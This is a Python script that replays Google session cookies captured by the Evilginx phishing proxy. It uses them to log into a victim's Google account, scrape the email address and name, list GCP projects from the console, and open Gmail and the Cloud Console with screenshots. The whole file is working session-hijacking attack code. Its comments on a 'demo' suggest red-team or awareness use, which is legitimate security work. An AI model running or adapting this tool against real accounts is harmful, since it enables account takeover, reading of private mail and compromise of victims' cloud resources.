#!/usr/bin/env python3
"""
replay_evilginx.py -- Replay an Evilginx session

KEY POINT: Google session cookies grant access to web interfaces
(Gmail, GCP Console, Drive) but NOT directly to GCP REST APIs which
require a Bearer OAuth2 token. The GCP console uses internal mechanisms
(gRPC-Web, proxy endpoints) to obtain this token -- not visible as a
simple Bearer header in Burp. To be investigated.

Modes:
  --mode api      Extract sensitive info via internal Google endpoints
                  that accept cookies (ListAccounts, myaccount, etc.)
                  + attempt DOM extraction from the GCP console.
  --mode browser  Visual demo: Gmail + GCP Console, screenshots.
  --mode both     Both modes.

Compatible with Evilginx sessions (session.json).
"""
import argparse, json, sys, glob, os, re

CONSOLE_ORIGIN = "https://console.cloud.google.com"

def find_session(sessions_dir):
    files = sorted(glob.glob(os.path.join(sessions_dir, "**", "session.json"), recursive=True),
                   key=os.path.getmtime)
    if not files:
        sys.exit(f"[-] No session.json found under {sessions_dir}")
    return files[-1]

def extract_cookies(session_file):
    s = json.load(open(session_file))
    cookies = []
    for domain, tok in s.get("tokens", {}).items():
        cookies += tok.get("cookies", [])
    print(f"[*] Session: {session_file}")
    print(f"[*] Victim: {s.get('username', '?')}")
    print(f"[*] {len(cookies)} cookies extracted")
    return cookies, s

def to_playwright(c):
    exp = c.get("expires", -1)
    ss  = c.get("sameSite") or "Lax"
    d = {
        "name": c["name"], "value": c["value"],
        "domain": c["domain"].lstrip(".") if c.get("hostOnly") else c["domain"],
        "path": c.get("path", "/"),
        "secure": c.get("secure", True),
        "httpOnly": c.get("httpOnly", False),
        "sameSite": ss if ss in ("Lax", "Strict", "None") else "Lax",
    }
    if exp and exp > 0:
        d["expires"] = int(exp)
    return d

def to_requests_jar(cookies):
    import requests
    jar = requests.cookies.RequestsCookieJar()
    for c in cookies:
        jar.set(c["name"], c["value"],
                domain=c["domain"].lstrip("."), path=c.get("path", "/"))
    return jar

def mode_api(cookies, browserEngine):
    import requests
    jar = to_requests_jar(cookies)

    # ============================================================
    # 1. MyAccount: account management page
    # ============================================================
    print("\n[*] 1. Accessing myaccount.google.com (account management page)")
    r1 = requests.get("https://myaccount.google.com/u/0/?tab=kk", cookies=jar, timeout=15)
    print(f"    HTTP {r1.status_code}")
    if r1.status_code == 200:
        #print(r1.text)
        accountDiv = re.search(r'<div>.+@.+\.\w+<\/div>', r1.text)
        email = re.search(r'"gb_Hc">.+@.+\.\w+', accountDiv.group())
        username = re.search(r'"gb_Ec">\w+', accountDiv.group())
        if email:
            print(f"    [+] Email extracted: {email.group().split(">")[-1].strip()}")
        if username:
            print(f"    [+] Username extracted: {username.group().split(">")[-1].strip()}")
        print("    [+] Access CONFIRMED to account management page")
    else:
        print("    [!] Access failed")

    # ============================================================
    # 2. Extraction from GCP console via Playwright (DOM)
    # ============================================================
    print("\n[*] 2. Extracting from GCP Console (Playwright + DOM)")
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        if browserEngine == "chrome":
            browser = p.chromium.launch(channel="chrome", headless=True)
        else:
            browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        gcookies = [to_playwright(c) for c in cookies if "google" in c["domain"]]
        ctx.add_cookies(gcookies)
        page = ctx.new_page()
        page.goto("https://console.cloud.google.com/iam-admin/projects", timeout=30000)
        page.wait_for_timeout(8000)
        page.screenshot(path="console_api_extract.png")
        # Attempt to extract project name from DOM
        # (selectors change frequently, adjust as needed for the demo)
        try:
            texts = page.evaluate("""() => {
                const links = Array.from(document.querySelectorAll('a[href*="/project/"]'));
                return links.map(a => a.innerText).filter(t => t.length > 0);
            }""")
            if texts:
                print(f"    [+] Projects found in DOM: {texts[:5]}")
            else:
                print("    [!] No projects found (DOM selectors likely changed)")
                print("    [*] Screenshot saved: console_api_extract.png")
        except Exception as e:
            print(f"    [!] DOM extraction error: {e}")
        browser.close()

    # ============================================================
    # Note on GCP REST APIs
    # ============================================================
    print("""
[*] NOTE on GCP REST APIs:
    REST APIs (cloudresourcemanager.googleapis.com, etc.) require a
    Bearer OAuth2 token. Session cookies are NOT sufficient.
    The GCP console obtains this token via an internal mechanism
    (gRPC-Web or invisible OAuth iframe), hard to intercept reliably.

    HOWEVER, access to the web console itself = full access to
    resources (VM, IAM, billing, etc.) via the interface.
""")

def mode_browser(cookies, browserEngine):
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        if browserEngine == "chrome":
            browser = p.chromium.launch(channel="chrome", headless=False)
        else:
            browser = p.chromium.launch(headless=False)
        ctx = browser.new_context()
        gcookies = [to_playwright(c) for c in cookies if "google" in c["domain"]]
        ctx.add_cookies(gcookies)
        page = ctx.new_page()
        page.goto("https://mail.google.com"); page.wait_for_timeout(4000)
        page.screenshot(path="gmail_aitm.png")
        page.goto(CONSOLE_ORIGIN); page.wait_for_timeout(6000)
        page.screenshot(path="console_aitm.png")
        print("[*] Screenshots: gmail_aitm.png, console_aitm.png")
        input("\n[?] Session open -- press Enter to close the browser...")
        browser.close()

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--sessions-dir", default="./sessions")
    ap.add_argument("--session-file", default=None)
    ap.add_argument("--mode", choices=["api", "browser", "both"], default="both")
    ap.add_argument("--browser", choices=["chrome", "chromium"], default="chrome")
    a = ap.parse_args()
    f = a.session_file or find_session(a.sessions_dir)
    cookies, _ = extract_cookies(f)
    browser = a.browser
    print(f"[*] Engine: {browser}")
    if a.mode in ("api", "both"):
        mode_api(cookies, browser)
    if a.mode in ("browser", "both"):
        mode_browser(cookies, browser)
